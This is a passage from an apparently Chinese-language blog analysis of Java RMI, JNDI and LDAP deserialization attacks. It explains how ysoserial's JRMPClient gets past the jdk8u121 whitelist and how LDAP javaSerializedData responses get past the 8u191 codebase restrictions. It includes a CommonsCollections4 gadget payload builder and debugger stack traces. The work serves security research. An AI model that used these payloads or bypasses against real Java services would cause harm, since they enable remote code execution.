                        false);
        RemoteRef ref =
            (csf == null) ? new UnicastRef(liveRef) : new UnicastRef2(liveRef);
        return (Registry) Util.createProxy(RegistryImpl.class, ref, false);
    }
可以很清楚的看到，这个方法执行最后返回的Registry，跟这个payload几行代码是一样的，而`LocateRegistry.getRegistry("127.0.0.1",
1099);`这行代码的意思，就是跟RMI Registry建立连接，那么这几行代码的意义就无疑了。
而既然这是一个gadget，那么反序列化的时候如何去触发呢？我们看看UnicastRef
    public class UnicastRef implements RemoteRef
    public interface RemoteRef extends java.io.Externalizable
可以看到，它间接的实现了Externalizable接口，熟悉的人就会知道，在其反序列化的时候会触发`readExternal`方法的执行，类似readObject
而在这个payload中，我们可以把host和port指定RMI Registry，然后跟踪其执行栈，可以发现RMI Registry执行栈如下：
    dispatch:-1, DGCImpl_Skel (sun.rmi.transport)
    oldDispatch:450, UnicastServerRef (sun.rmi.server)
    dispatch:294, UnicastServerRef (sun.rmi.server)
    run:200, Transport$1 (sun.rmi.transport)
    run:197, Transport$1 (sun.rmi.transport)
    doPrivileged:-1, AccessController (java.security)
    serviceCall:196, Transport (sun.rmi.transport)
    handleMessages:568, TCPTransport (sun.rmi.transport.tcp)
    run0:826, TCPTransport$ConnectionHandler (sun.rmi.transport.tcp)
    lambda$run$0:683, TCPTransport$ConnectionHandler (sun.rmi.transport.tcp)
    run:-1, 1095644560 (sun.rmi.transport.tcp.TCPTransport$ConnectionHandler$$Lambda$5)
    doPrivileged:-1, AccessController (java.security)
    run:682, TCPTransport$ConnectionHandler (sun.rmi.transport.tcp)
    runWorker:1142, ThreadPoolExecutor (java.util.concurrent)
    run:617, ThreadPoolExecutor$Worker (java.util.concurrent)
    run:745, Thread (java.lang)
其源码：
    public void dispatch(Remote var1, RemoteCall var2, int var3, long var4) throws Exception {
        if (var4 != -669196253586618813L) {
          throw new SkeletonMismatchException("interface hash mismatch");
        } else {
          DGCImpl var6 = (DGCImpl)var1;
          ObjID[] var7;
          long var8;
          switch(var3) {
          case 0:
            VMID var39;
            boolean var40;
            try {
              ObjectInput var14 = var2.getInputStream();
              var7 = (ObjID[])var14.readObject();
              var8 = var14.readLong();
              var39 = (VMID)var14.readObject();
              var40 = var14.readBoolean();
            } catch (IOException var36) {
              throw new UnmarshalException("error unmarshalling arguments", var36);
            } catch (ClassNotFoundException var37) {
              throw new UnmarshalException("error unmarshalling arguments", var37);
            } finally {
              var2.releaseInputStream();
            }
            var6.clean(var7, var8, var39, var40);
            try {
              var2.getResultStream(true);
              break;
            } catch (IOException var35) {
              throw new MarshalException("error marshalling return", var35);
            }
          case 1:
            Lease var10;
            try {
              ObjectInput var13 = var2.getInputStream();
              var7 = (ObjID[])var13.readObject();
              var8 = var13.readLong();
              var10 = (Lease)var13.readObject();
            } catch (IOException var32) {
              throw new UnmarshalException("error unmarshalling arguments", var32);
            } catch (ClassNotFoundException var33) {
              throw new UnmarshalException("error unmarshalling arguments", var33);
            } finally {
              var2.releaseInputStream();
            }
            Lease var11 = var6.dirty(var7, var8, var10);
            try {
              ObjectOutput var12 = var2.getResultStream(true);
              var12.writeObject(var11);
              break;
            } catch (IOException var31) {
              throw new MarshalException("error marshalling return", var31);
            }
          default:
            throw new UnmarshalException("invalid method number");
          }
        }
    }
在debug中，我们可以发现第三个参数为1，也就是说，其中sun.rmi.transport.DGCImpl_Skel#dispatch的代码，会执行到case=1的部分，可以看到，其中做了writeObject，那么，也就是说这三行payload的反序列化，会与RMI
Registry连接上，执行分布式的GC，并且RMI
Registry会发送序列化数据给连接发起者，最终造成反序列化，而反序列化部分代码，我们这里简单的跟一下吧。
其执行栈大概如下：
    dirty:-1, DGCImpl_Stub (sun.rmi.transport)
    makeDirtyCall:378, DGCClient$EndpointEntry (sun.rmi.transport)
    registerRefs:320, DGCClient$EndpointEntry (sun.rmi.transport)
    registerRefs:156, DGCClient (sun.rmi.transport)
    read:312, LiveRef (sun.rmi.transport)
    readExternal:493, UnicastRef (sun.rmi.server)
    readExternalData:2062, ObjectInputStream (java.io)
    readOrdinaryObject:2011, ObjectInputStream (java.io)
    readObject0:1535, ObjectInputStream (java.io)
    readObject:422, ObjectInputStream (java.io)
    deserialize:27, Deserializer (ysoserial)
    deserialize:22, Deserializer (ysoserial)
    run:60, PayloadRunner (ysoserial.payloads.util)
    main:84, JRMPClient1 (ysoserial.payloads)
跟进DGCImpl_Stub的dirty方法，可以看到：
    public Lease dirty(ObjID[] var1, long var2, Lease var4) throws RemoteException {
        try {
          RemoteCall var5 = super.ref.newCall(this, operations, 1, -669196253586618813L);
          try {
            ObjectOutput var6 = var5.getOutputStream();
            var6.writeObject(var1);
            var6.writeLong(var2);
            var6.writeObject(var4);
          } catch (IOException var20) {
            throw new MarshalException("error marshalling arguments", var20);
          }
          super.ref.invoke(var5);
          Lease var24;
          try {
            ObjectInput var9 = var5.getInputStream();
            var24 = (Lease)var9.readObject();
          } catch (IOException var17) {
            throw new UnmarshalException("error unmarshalling return", var17);
          } catch (ClassNotFoundException var18) {
            throw new UnmarshalException("error unmarshalling return", var18);
          } finally {
            super.ref.done(var5);
          }
          return var24;
        } catch (RuntimeException var21) {
          throw var21;
        } catch (RemoteException var22) {
          throw var22;
        } catch (Exception var23) {
          throw new UnexpectedException("undeclared checked exception", var23);
        }
    }
其中，的确对返回数据进行了反序列化，也就是说，在jdk8u121之后，可以通过UnicastRef这个在RMI反序列化白名单内的gadget进行攻击。
因此，我们可以通过这个payload绕过RMI反序列化白名单限制，虽然，白名单是绕过了，但是还是存在gadget依赖问题，如果没有相应的gadget依赖，我们也没办法达到RCE。
不过，这里可以总结一下了：ysoserial的JRMPClient payload是为了绕过jdk8u121后出现的白名单限制。
说完需要gadget依赖的打法限制问题了，那么我们再来看看前面所讲的使用JNDI攻击执行`new
InitialContext().lookup("rmi://127.0.0.1:1099/Calc")`的客户端。
在jdk8u121之后，对于Reference加载远程代码，jdk的信任机制，在通过rmi加载远程代码的时候，会判断环境变量`com.sun.jndi.rmi.object.trustURLCodebase`是否为true，而其在121版本及后，默认为false，也就是说，在jdk8u121之后，我们就没办法通过rmi服务的JNDI方式打客户端了，那么，有没有其他办法呢？
有，使用ldap协议的JNDI，具体怎么搭这样的一个服务这里就不讲了，marshalsec也有现成的，我们这里只试试对客户端的攻击，并看看客户端做了什么事情吧。
大概触发RCE的执行栈是这样的：
    getObjectFactoryFromReference:146, NamingManager (javax.naming.spi)
    getObjectInstance:189, DirectoryManager (javax.naming.spi)
    c_lookup:1085, LdapCtx (com.sun.jndi.ldap)
    p_lookup:542, ComponentContext (com.sun.jndi.toolkit.ctx)
    lookup:177, PartialCompositeContext (com.sun.jndi.toolkit.ctx)
    lookup:205, GenericURLContext (com.sun.jndi.toolkit.url)
    lookup:94, ldapURLContext (com.sun.jndi.url.ldap)
    lookup:417, InitialContext (javax.naming)
    main:17, JndiAttackLookup (com.threedr3am.bug.rmi.client)
在里面，我并没有找到相关类似远程代码信任机制的东西，也就是说，通过ldap协议的jndi服务方式，在jdk8u121后，能攻击执行`new
InitialContext().lookup("rmi://127.0.0.1:1099/Calc")`的客户端
#### jdk版本 > jdk8u191
为什么继续讲jdk8u191呢，因为在jdk8u191之后，加入LDAP远程Reference代码信任机制，LDAP远程代码攻击方式开始失效，也就是系统变量`com.sun.jndi.ldap.object.trustURLCodebase`默认为false（CVE-2018-3149）
既然不能去Reference加载远程代码执行了，那么，是不是能不用Reference去加载呢？
对，还有一种方式，看执行栈：
    deserializeObject:527, Obj (com.sun.jndi.ldap)
    decodeObject:239, Obj (com.sun.jndi.ldap)
    c_lookup:1051, LdapCtx (com.sun.jndi.ldap)
    p_lookup:542, ComponentContext (com.sun.jndi.toolkit.ctx)
    lookup:177, PartialCompositeContext (com.sun.jndi.toolkit.ctx)
    lookup:205, GenericURLContext (com.sun.jndi.toolkit.url)
    lookup:94, ldapURLContext (com.sun.jndi.url.ldap)
    lookup:417, InitialContext (javax.naming)
    main:42, JndiAttackLookup (com.threedr3am.bug.rmi.client)
    private static Object deserializeObject(byte[] var0, ClassLoader var1) throws NamingException {
        try {
          ByteArrayInputStream var2 = new ByteArrayInputStream(var0);
          try {
            Object var20 = var1 == null ? new ObjectInputStream(var2) : new Obj.LoaderInputStream(var2, var1);
            Throwable var21 = null;
            Object var5;
            try {
              var5 = ((ObjectInputStream)var20).readObject();
            } catch (Throwable var16) {
              var21 = var16;
              throw var16;
            } finally {
              if (var20 != null) {
                if (var21 != null) {
                  try {
                    ((ObjectInputStream)var20).close();
                  } catch (Throwable var15) {
                    var21.addSuppressed(var15);
                  }
                } else {
                  ((ObjectInputStream)var20).close();
                }
              }
            }
            return var5;
          } catch (ClassNotFoundException var18) {
            NamingException var4 = new NamingException();
            var4.setRootCause(var18);
            throw var4;
          }
        } catch (IOException var19) {
          NamingException var3 = new NamingException();
          var3.setRootCause(var19);
          throw var3;
        }
    }
也就是，可以通过修改ldap服务的对象返回内容，达到反序列化攻击
为什么呢，看上一层
    static Object decodeObject(Attributes var0) throws NamingException {
        String[] var2 = getCodebases(var0.get(JAVA_ATTRIBUTES[4]));
        try {
          Attribute var1;
          if ((var1 = var0.get(JAVA_ATTRIBUTES[1])) != null) {
            ClassLoader var3 = helper.getURLClassLoader(var2);
            return deserializeObject((byte[])((byte[])var1.get()), var3);
          } else if ((var1 = var0.get(JAVA_ATTRIBUTES[7])) != null) {
            return decodeRmiObject((String)var0.get(JAVA_ATTRIBUTES[2]).get(), (String)var1.get(), var2);
          } else {
            var1 = var0.get(JAVA_ATTRIBUTES[0]);
            return var1 == null || !var1.contains(JAVA_OBJECT_CLASSES[2]) && !var1.contains(JAVA_OBJECT_CLASSES_LOWER[2]) ? null : decodeReference(var0, var2);
          }
        } catch (IOException var5) {
          NamingException var4 = new NamingException();
          var4.setRootCause(var5);
          throw var4;
        }
    }
其中`(var1 = var0.get(JAVA_ATTRIBUTES[1])) !=
null`判断了JAVA_ATTRIBUTES[1]是否为空，这是哪个参数呢？
    static final String[] JAVA_ATTRIBUTES = new String[]{"objectClass", "javaSerializedData", "javaClassName", "javaFactory", "javaCodeBase", "javaReferenceAddress", "javaClassNames", "javaRemoteLocation"};
是一个名为javaSerializedData的参数，所以，我们可以通过修改ldap服务直接返回javaSerializedData参数的数据（序列化gadget数据），达到反序列化RCE
首先，我们通过该方法，制造Common-Collectios4 gadget的base64序列化数据
    private static byte[] makePayload(String[] args) throws Exception {
        final Object templates = Gadgets.createTemplatesImpl(args[0]);
        // mock method name until armed
        final InvokerTransformer transformer = new InvokerTransformer("toString", new Class[0], new Object[0]);
        // create queue with numbers and basic comparator
        final PriorityQueue queue = new PriorityQueue(2,new TransformingComparator(transformer));
        // stub data for replacement later
        queue.add(1);
        queue.add(1);
        // switch method called by comparator
        Reflections.setFieldValue(transformer, "iMethodName", "newTransformer");
        // switch contents of queue
        final Object[] queueArray = (Object[]) Reflections.getFieldValue(queue, "queue");
        queueArray[0] = templates;
        queueArray[1] = 1;
        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
        objectOutputStream.writeObject(queue);
        objectOutputStream.close();
        return byteArrayOutputStream.toByteArray();
    }
接着，添加ldap服务的attribute javaSerializedData
    e.addAttribute("javaSerializedData", classData);
总结：jdk8u191后，ldap Reference的攻击方式不能使用，需要通过javaSerializedData返回序列化gadget方式实现
### 0x03 JRMP Gadget还有用吗？
很多人以为天天讲RMI攻击什么的，觉得很鸡肋，其实并不然，其中涉及到的很多知识，在其他地方我们完全能用上，就比如，我们使用RMI和LDAP协议的JNDI去攻击客户端，以及我前段时间讲的Shiro文章[《Apache
Shiro源码浅析之从远古洞到最新PaddingOracle
CBC》](https://xz.aliyun.com/t/7207)，完全可以利用JRMPClient的gadget payload去加快Padding
Oracle CBC攻击的速度等等...
### 参考
[如何绕过高版本 JDK 的限制进行 JNDI 注入利用](https://paper.seebug.org/942/)
[Java 中
RMI、JNDI、LDAP、JRMP、JMX、JMS那些事儿（上）](https://www.anquanke.com/post/id/194384)